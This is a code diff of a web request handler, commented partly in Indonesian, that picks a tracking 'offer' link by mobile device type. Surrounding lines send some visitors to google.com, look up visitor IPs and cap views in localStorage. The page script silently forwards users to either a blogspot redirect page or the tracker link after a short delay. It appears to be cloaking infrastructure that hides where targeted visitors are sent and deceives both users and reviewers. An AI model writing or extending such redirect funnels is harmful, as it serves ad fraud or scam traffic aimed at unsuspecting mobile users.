@@ -22,6 +22,14 @@ export async function onRequest(context) {
     return Response.redirect("https://google.com", 302);
   }
 
+  // Pilih offer URL sesuai device
+  let offerURL = "";
+  if (isAndroid) {
+    offerURL = "https://idjjk.bemobtrcks.com/click";
+  } else if (isIphone) {
+    offerURL = "https://fgs4f.bemobtrcks.com/click";
+  }
+
   // 3. Fetch from ip-api.com
   let data = {};
   try {
@@ -59,7 +67,7 @@ export async function onRequest(context) {
         const now = Date.now();
         const maxViews = 2;
         const limitHours = 24;
-        const offerURL = "https://z9nuz.bemobtrcks.com/click";
+        const offerURL = "${offerURL}";
         const selectedURL = "https://redrect22.blogspot.com/";
 
         let record = localStorage.getItem("accessRecord");
@@ -80,7 +88,7 @@ export async function onRequest(context) {
           window.location.href = "https://redrect22.blogspot.com/";
         } else {
           setTimeout(() => {
-            window.location.href = "https://z9nuz.bemobtrcks.com/click";
+            window.location.href = offerURL;
           }, 200);
         }
 
